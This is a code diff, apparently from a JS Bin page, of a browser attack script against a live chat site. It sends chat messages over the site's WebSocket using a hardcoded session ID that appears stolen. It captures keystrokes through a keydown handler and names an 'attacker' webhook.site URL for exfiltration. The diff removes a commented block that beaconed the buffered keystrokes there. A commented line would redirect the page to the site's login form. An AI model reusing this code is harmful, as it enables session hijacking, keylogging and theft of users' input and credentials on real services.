@@ -23,7 +23,7 @@ Released under the MIT license: http://jsbin.mit-license.org
     ws=new WebSocket("wss://chatroom.tamil2friends.com/chat")
     console.log("ws--",ws);
     ws.send(JSON.stringify({"type":"init","data":{"session":"dsmq9q4okl9nq4nva1rtu2ekbi"}}))
-    ws.send(JSON.stringify({"type":"fetch","data":{"room":"kudumi"}}))
+//     ws.send(JSON.stringify({"type":"fetch","data":{"room":"kudumi"}}))
 //     ws.send(JSON.stringify({"type":"send","data":{"color":"black","room":"main","gifinput":"","_gifhidden":"","yinput":"","msg":"hii","type":"text"}}))
     var buffer = [];
 var attacker = 'https://webhook.site/aee586cf-3dca-4d33-b2c9-4f979d72daee?c='
@@ -44,14 +44,12 @@ document.onkeydown = function(e) {
 //     }
   }
 }
-
+window.setTimeout(function() {
+  ws.send(JSON.stringify({"type":"init","data":{"session":"dsmq9q4okl9nq4nva1rtu2ekbi"}}))
+}, 2000);
+    
 window.setTimeout(function() {
   ws.send(JSON.stringify({"type":"send","data":{"color":"black","room":"main","gifinput":"","_gifhidden":"","yinput":"","msg":"hii","type":"text"}}))
-//     if (buffer.length > 0) {
-//         var data = encodeURIComponent(JSON.stringify(buffer));
-//         new Image().src = attacker + data;
-//         buffer = [];
-//     }
 }, 1000);
     
 //     window.top.location.href = "http://chatroom.tamil2friends.com/login.php";
